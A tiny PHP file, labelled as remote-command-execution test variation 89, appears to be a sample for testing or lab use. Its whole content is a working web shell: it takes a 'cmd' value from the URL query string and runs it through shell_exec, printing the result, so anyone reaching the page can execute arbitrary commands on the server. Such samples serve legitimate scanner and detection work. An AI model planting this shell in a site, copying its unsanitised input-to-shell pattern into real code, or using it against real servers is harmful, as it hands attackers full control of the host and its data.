<?php
// RCE test variation #89
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>